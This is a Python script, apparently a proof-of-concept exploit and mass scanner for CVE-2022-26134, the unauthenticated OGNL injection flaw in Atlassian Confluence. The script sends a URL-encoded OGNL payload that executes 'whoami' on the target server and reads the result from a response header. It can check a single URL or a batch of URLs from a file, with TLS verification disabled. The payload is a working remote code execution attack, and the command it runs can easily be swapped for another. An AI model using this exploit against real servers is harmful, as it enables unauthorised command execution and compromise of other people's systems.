import requests
import argparse
import os
import urllib3
import sys

urllib3.disable_warnings()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0'
}

def check(url):
    payload = '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'
    url0 = url + payload
    try:
        resp = requests.get(url=url0,headers=headers,verify=False,allow_redirects=False)
        if "X-Cmd-Response" in resp.headers and resp.status_code==302:
            print('[√] '+url+' VUL')
        else:
            print("[x] "+url+" not vul")
    except:
        print("connect failed.")

def batch(file):
    for url_link in open(file, 'r', encoding='utf-8'):
        if url_link.strip() != '':
            url_path = format_url(url_link.strip())
            check(url_path)

def format_url(url):
    try:
        if url[:4] != "http":
            url = "https://" + url
            url = url.strip()
        return url
    except Exception as e:
        print('URL 错误 {0}'.format(url))

if __name__ == '__main__':
    print('-'*70)
    print("Atlassian Confluence 未经身份验证的远程 OGNL 注入漏洞（CVE-2022-26134）\n\n\t\t\t\t\t\t ---LUCKYZ")
    print('-' * 70)
    parser = argparse.ArgumentParser(description="CVE-2022-26134 confluence RCE --by luckyZ",
                                     usage="\n    单一目标检测：python3 exp.py -u https://www.evil.com/ --check\n"
                                           "    批量检测：python3 exp.py -f url.txt --check")

    parser.add_argument('-u', action="store", dest="url", help="目标url")
    parser.add_argument('--check', action="store_true", dest='check', help="漏洞检测")
    parser.add_argument('-f', action="store", dest='file', help='批量检测')
    args = parser.parse_args()

    if args.check == True and args.file is None:
        url = args.url
        check(url)
        sys.exit(0)

    elif args.check == True and args.file != "":
        batch(args.file)
        sys.exit(0)

    else:
        print("please input '--help' for instructions")